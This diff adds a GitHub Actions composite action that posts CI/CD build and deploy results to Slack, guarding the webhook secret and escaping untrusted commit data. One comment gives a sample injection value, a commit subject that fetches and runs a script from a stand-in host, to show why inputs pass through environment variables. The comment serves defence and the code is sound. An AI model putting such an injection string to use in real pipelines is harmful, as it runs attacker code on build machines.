@@ -1,0 +1,345 @@
+name: "Slack build notification"
+description: >-
+  Post a CI/CD outcome to a Slack incoming webhook. Does nothing, quietly, when
+  the webhook secret is absent, and never fails the job that calls it.
+
+# WHY THIS IS AN ACTION AND NOT FORTY LINES PASTED INTO EACH WORKFLOW
+# -------------------------------------------------------------------
+# There are five workflows across two repositories. Pasting the payload
+# construction into each one means five places to fix when Slack changes a
+# field name, and -- worse -- five places where one of them can quietly stop
+# escaping something. The message shape lives here, once per repository.
+#
+# It is duplicated across the two repositories rather than shared from one of
+# them. A cross-repository `uses:` would pin cloudguest-foundation's CI to a
+# mutable ref in cloud-guest, so renaming or making that repository private
+# would break deploys in this one, and a repository-rename is not the moment
+# you want to discover a hidden dependency. The two copies are byte-identical;
+# keep them that way (`shasum` both after any edit).
+#
+# WHAT THIS NEVER DOES
+# --------------------
+#   * fail. Every external call is guarded and the script ends in `exit 0`.
+#     A monitoring integration that breaks a build is worse than no monitoring,
+#     and this one sits on the deploy path.
+#   * print the webhook. It arrives as an environment variable, is passed to
+#     curl as its final argument, and is never echoed, never interpolated into
+#     the script text, and never written to a file that is uploaded.
+#   * build JSON by string concatenation. Commit subjects and branch names are
+#     attacker-controllable on a pull request; every one of them reaches the
+#     payload through `jq --arg`, and reaches this script through `env:` rather
+#     than through `${{ }}` inside `run:`.
+
+inputs:
+  # NOTE FOR ANYONE EDITING THIS FILE: a composite action has no `secrets`
+  # context, and the runner evaluates ${{ }} expressions in input DESCRIPTIONS
+  # as well as in values. Writing `${{ secrets.SLACK_WEBHOOK_URL }}` anywhere
+  # outside a comment -- even in prose explaining what to pass -- fails the
+  # whole action at load time with:
+  #
+  #   Unrecognized named-value: 'secrets'
+  #
+  # actionlint does not catch it. It cost a smoke-test run to find, and in a
+  # real workflow it would have shown up only once a build was already broken,
+  # which is the worst possible moment for the notifier to be the thing that
+  # is broken. The secret is named in the calling workflows and nowhere here.
+  webhook_url:
+    description: >-
+      Slack incoming webhook -- the SLACK_WEBHOOK_URL repository secret, passed
+      in by the calling workflow. Empty, which is what an unset secret and a
+      pull request from a fork both produce, means: do nothing, quietly.
+    required: false
+    default: ""
+  needs_json:
+    description: >-
+      toJSON(needs) from the calling job. The overall status is derived from
+      the per-job results so that a skipped-because-an-earlier-job-failed
+      pipeline reports as a failure rather than as a success.
+    required: false
+    default: "{}"
+  status:
+    description: "Explicit status (success | failure | cancelled). Overrides needs_json."
+    required: false
+    default: ""
+  kind:
+    description: "CI or CD. Wording only."
+    required: false
+    default: "CI"
+  environment:
+    description: "Deploy target -- production, staging. CD only."
+    required: false
+    default: ""
+  image:
+    description: "Fully-qualified image ref that was deployed. CD only."
+    required: false
+    default: ""
+  commit_sha:
+    description: >-
+      The SHA that was actually built or deployed, when it is not github.sha --
+      a workflow_dispatch rollback names an older SHA, and reporting the ref's
+      HEAD there would name a commit that is not what is now running.
+    required: false
+    default: ""
+
+runs:
+  using: composite
+  steps:
+    - name: Post the build status to Slack
+      shell: bash
+      # Pinned explicitly. cloud-guest's ci.yml sets a workflow-level
+      # `defaults.run.working-directory: backend`, and whether that reaches
+      # into a composite action's steps is a detail not worth depending on --
+      # especially as the calling job checks out `.github/` only, so `backend`
+      # does not exist there.
+      working-directory: ${{ github.workspace }}
+      env:
+        # Every value below is untrusted-by-default and arrives as an
+        # environment variable. None of them are interpolated into the script
+        # text, so a commit subject of `"; curl evil.sh | sh; #` is a string
+        # and not a command.
+        SLACK_WEBHOOK_URL: ${{ inputs.webhook_url }}
+        IN_NEEDS_JSON: ${{ inputs.needs_json }}
+        IN_STATUS: ${{ inputs.status }}
+        IN_KIND: ${{ inputs.kind }}
+        IN_ENVIRONMENT: ${{ inputs.environment }}
+        IN_IMAGE: ${{ inputs.image }}
+        IN_SHA: ${{ inputs.commit_sha }}
+        CTX_SUBJECT: ${{ github.event.head_commit.message }}
+        CTX_PR_TITLE: ${{ github.event.pull_request.title }}
+        CTX_ACTOR: ${{ github.actor }}
+        CTX_BRANCH: ${{ github.head_ref || github.ref_name }}
+        CTX_WORKFLOW: ${{ github.workflow }}
+        CTX_EVENT: ${{ github.event_name }}
+        GH_TOKEN: ${{ github.token }}
+      run: |
+        # No `set -e`: a failure to notify must not be a failure to build.
+        # No `set -x`: it would print the curl argument list.
+        set -uo pipefail
+
+        TMP="${RUNNER_TEMP:-/tmp}"
+
+        # ---------------------------------------------------------------
+        # 1. No webhook, no notification, no failure.
+        # ---------------------------------------------------------------
+        # This is the path taken by a pull request opened from a fork:
+        # GitHub does not expose repository secrets to those runs, by
+        # design, so the input arrives empty. It is also the path taken
+        # before anyone has created the secret, and the path taken when
+        # cd.yml calls ci.yml as a reusable workflow (it deliberately does
+        # not pass the secret down -- the CD run notifies for the whole
+        # pipeline, so the nested CI must stay quiet or every deploy
+        # failure would arrive twice).
+        if [ -z "${SLACK_WEBHOOK_URL:-}" ]; then
+          echo "::notice title=Slack::No SLACK_WEBHOOK_URL for this run - skipping the Slack notification. This is expected for pull requests from forks and for a repository where the secret has not been created yet; it is not a build failure."
+          exit 0
+        fi
+
+        # A misconfigured secret should not turn this step into an
+        # arbitrary outbound POST carrying commit metadata to whatever host
+        # someone pasted in. Nothing about the value is printed.
+        case "$SLACK_WEBHOOK_URL" in
+          https://hooks.slack.com/*) ;;
+          *)
+            echo "::warning title=Slack::SLACK_WEBHOOK_URL is set but is not a https://hooks.slack.com/ URL. Refusing to post."
+            exit 0
+            ;;
+        esac
+
+        # ---------------------------------------------------------------
+        # 2. Derive one status from the per-job results.
+        # ---------------------------------------------------------------
+        # `success()` on the notify job is not enough: in a CD pipeline a
+        # failed `ci` job leaves `build` and `deploy` *skipped*, not failed,
+        # and a notify job that only looked at its own outcome would cheerfully
+        # report a green deploy that never happened. Failure wins over
+        # cancellation wins over success, and an all-skipped pipeline is
+        # nothing worth saying.
+        STATUS="${IN_STATUS:-}"
+        if [ -z "$STATUS" ]; then
+          STATUS=$(printf '%s' "${IN_NEEDS_JSON:-}" | jq -r '
+            [ (.. | objects | select(has("result")) | .result) ] as $r
+            | if   ($r | index("failure"))    then "failure"
+              elif ($r | index("timed_out"))  then "failure"
+              elif ($r | index("cancelled"))  then "cancelled"
+              elif ($r | index("success"))    then "success"
+              elif ($r | length) > 0          then "skipped"
+              else "unknown" end
+          ' 2>/dev/null) || STATUS="unknown"
+          [ -z "$STATUS" ] && STATUS="unknown"
+        fi
+
+        if [ "$STATUS" = "skipped" ]; then
+          echo "::notice title=Slack::Every job in this run was skipped; nothing to report."
+          exit 0
+        fi
+
+        case "$STATUS" in
+          success)   EMOJI=":white_check_mark:"; COLOR="#2eb886"; WORD="succeeded" ;;
+          failure)   EMOJI=":rotating_light:";   COLOR="#c62828"; WORD="FAILED" ;;
+          cancelled) EMOJI=":black_square_for_stop:"; COLOR="#9aa0a6"; WORD="was cancelled" ;;
+          *)         EMOJI=":grey_question:";    COLOR="#9aa0a6"; WORD="finished ($STATUS)" ;;
+        esac
+
+        # ---------------------------------------------------------------
+        # 3. Commit, author and duration.
+        # ---------------------------------------------------------------
+        # The SHA that was deployed, which on a workflow_dispatch rollback is
+        # not the SHA of the ref the workflow ran on. Reduced to the characters
+        # a git ref can contain before it is ever used in a URL.
+        SHA=$(printf '%s' "${IN_SHA:-}" | tr -cd 'A-Za-z0-9._-')
+        [ -z "$SHA" ] && SHA="${GITHUB_SHA:-}"
+        SHORT=$(printf '%s' "$SHA" | cut -c1-7)
+
+        # One API call gives run_started_at (for the duration) and the head
+        # commit. Guarded on every side: a repository whose token cannot read
+        # Actions just loses the duration field, it does not lose the alert.
+        RUN_JSON=$(gh api "repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}" 2>/dev/null) || RUN_JSON=""
+        [ -z "$RUN_JSON" ] && RUN_JSON='{}'
+
+        DURATION=""
+        STARTED=$(printf '%s' "$RUN_JSON" | jq -r '.run_started_at // empty' 2>/dev/null)
+        if [ -n "${STARTED:-}" ]; then
+          T0=$(date -u -d "$STARTED" +%s 2>/dev/null || echo "")
+          if [ -n "$T0" ]; then
+            D=$(( $(date -u +%s) - T0 ))
+            [ "$D" -lt 0 ] && D=0
+            DURATION=$(printf '%dm %02ds' "$(( D / 60 ))" "$(( D % 60 ))")
+          fi
+        fi
+
+        # Preference order: the push event's own head commit, then a pull
+        # request title, then whatever the run object knows.
+        SUBJECT="${CTX_SUBJECT:-}"
+        [ -z "$SUBJECT" ] && SUBJECT="${CTX_PR_TITLE:-}"
+        [ -z "$SUBJECT" ] && SUBJECT=$(printf '%s' "$RUN_JSON" | jq -r '.head_commit.message // empty' 2>/dev/null)
+        AUTHOR=$(printf '%s' "$RUN_JSON" | jq -r '.head_commit.author.name // empty' 2>/dev/null)
+
+        # A rollback deploys a commit that is not this run's head commit, so
+        # the run object describes the wrong one. Ask about the real SHA.
+        if [ -n "${IN_SHA:-}" ] && [ "$SHA" != "${GITHUB_SHA:-}" ]; then
+          C_JSON=$(gh api "repos/${GITHUB_REPOSITORY}/commits/${SHA}" 2>/dev/null) || C_JSON=""
+          if [ -n "$C_JSON" ]; then
+            SUBJECT=$(printf '%s' "$C_JSON" | jq -r '.commit.message // empty' 2>/dev/null)
+            AUTHOR=$(printf '%s' "$C_JSON" | jq -r '.commit.author.name // empty' 2>/dev/null)
+          fi
+        fi
+        [ -z "${AUTHOR:-}" ] && AUTHOR="${CTX_ACTOR:-unknown}"
+
+        RUN_URL="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}"
+        [ "${GITHUB_RUN_ATTEMPT:-1}" != "1" ] && RUN_URL="${RUN_URL}/attempts/${GITHUB_RUN_ATTEMPT}"
+        COMMIT_URL="${GITHUB_SERVER_URL}/${GITHUB_REPOSITORY}/commit/${SHA}"
+
+        # ---------------------------------------------------------------
+        # 4. Build the payload. Every dynamic value goes through --arg.
+        # ---------------------------------------------------------------
+        # `esc` is Slack's mrkdwn escaping, which is a separate concern from
+        # JSON escaping: jq handles the latter, but a branch called
+        # `fix/<script>` would still be read by Slack as markup. Ampersand
+        # first, or the other two substitutions get double-escaped.
+        jq -n \
+          --arg repo       "${GITHUB_REPOSITORY:-}" \
+          --arg workflow   "${CTX_WORKFLOW:-}" \
+          --arg run_number "${GITHUB_RUN_NUMBER:-}" \
+          --arg kind       "${IN_KIND:-CI}" \
+          --arg word       "$WORD" \
+          --arg emoji      "$EMOJI" \
+          --arg color      "$COLOR" \
+          --arg branch     "${CTX_BRANCH:-}" \
+          --arg sha        "$SHA" \
+          --arg short      "$SHORT" \
+          --arg subject    "${SUBJECT:-}" \
+          --arg author     "${AUTHOR:-}" \
+          --arg duration   "${DURATION:-}" \
+          --arg event      "${CTX_EVENT:-}" \
+          --arg envname    "${IN_ENVIRONMENT:-}" \
+          --arg image      "${IN_IMAGE:-}" \
+          --arg run_url    "$RUN_URL" \
+          --arg commit_url "$COMMIT_URL" \
+          --argjson needs  "$(printf '%s' "${IN_NEEDS_JSON:-}" | jq -c '.' 2>/dev/null || echo '{}')" \
+          '
+          def esc: tostring | gsub("&"; "&amp;") | gsub("<"; "&lt;") | gsub(">"; "&gt;");
+          def clip($n): if (length > $n) then (.[0:$n] + "…") else . end;
+          def field($label; $value):
+            if ($value | length) > 0
+            then [ { type: "mrkdwn", text: ("*" + $label + "*\n" + $value) } ]
+            else [] end;
+
+          ( $subject | split("\n") | (.[0] // "") | clip(180) | esc ) as $subj
+          | ( $image | sub("^[^/]+/"; "") | clip(120) | esc ) as $img
+          | ( [ $needs | to_entries[]? | (.key + ": " + (.value.result // "?")) ] | join("  ·  ") ) as $stages
+          | ( $kind + " " + $word ) as $headline
+          | ( if ($envname | length) > 0 then " → *" + ($envname | esc) + "*" else "" end ) as $envbit
+          | {
+              text: (($headline + " - " + $repo + " " + $workflow
+                      + " on " + $branch + " (" + $short + ")" | esc)
+                     + " " + $run_url),
+              attachments: [
+                {
+                  color: $color,
+                  blocks: (
+                    [
+                      {
+                        type: "section",
+                        text: {
+                          type: "mrkdwn",
+                          text: ( $emoji + " *" + ($headline | esc) + "*" + $envbit + "\n"
+                                  + "<" + $run_url + "|" + ($workflow | esc) + " #" + $run_number + ">"
+                                  + "  ·  `" + ($repo | esc) + "`"
+                                  + "  ·  branch `" + ($branch | esc) + "`" )
+                        }
+                      },
+                      {
+                        type: "section",
+                        fields: (
+                            field("Commit";
+                                  ("<" + $commit_url + "|`" + ($short | esc) + "`>"
+                                   + (if ($subj | length) > 0 then "  " + $subj else "" end)))
+                          + field("Author"; ($author | esc))
+                          + field("Duration"; ($duration | esc))
+                          + field("Trigger"; ("`" + ($event | esc) + "`"))
+                          + field("Environment"; ($envname | esc))
+                          + (if ($img | length) > 0
+                             then field("Image"; ("`" + $img + "`"))
+                             else [] end)
+                        )
+                      }
+                    ]
+                    + ( if ($stages | length) > 0
+                        then [ { type: "context",
+                                 elements: [ { type: "mrkdwn", text: ($stages | esc) } ] } ]
+                        else [] end )
+                  )
+                }
+              ]
+            }
+          ' > "$TMP/slack-payload.json" || {
+            echo "::warning title=Slack::Could not build the Slack payload; not posting."
+            exit 0
+          }
+
+        echo "::group::Slack payload (contains no secret)"
+        cat "$TMP/slack-payload.json"
+        echo "::endgroup::"
+
+        # ---------------------------------------------------------------
+        # 5. Post it.
+        # ---------------------------------------------------------------
+        # The webhook is curl's last argument and is never echoed; the body
+        # comes from a file so it is not on the command line either. No -v:
+        # verbose mode prints the request URL.
+        CODE=$(curl -sS -o "$TMP/slack-response.txt" -w '%{http_code}' \
+                 --max-time 20 --retry 2 --retry-connrefused \
+                 -X POST -H 'Content-Type: application/json' \
+                 --data-binary "@$TMP/slack-payload.json" \
+                 "$SLACK_WEBHOOK_URL") || CODE="000"
+
+        if [ "$CODE" = "200" ]; then
+          echo "Slack accepted the notification (HTTP 200)."
+        else
+          # Slack answers errors with a short token such as `invalid_payload`
+          # or `no_service`; none of them echo the URL back.
+          echo "::warning title=Slack::Slack returned HTTP ${CODE}: $(head -c 200 "$TMP/slack-response.txt" 2>/dev/null). The build result is unaffected."
+        fi
+
+        rm -f "$TMP/slack-payload.json" "$TMP/slack-response.txt"
+        exit 0
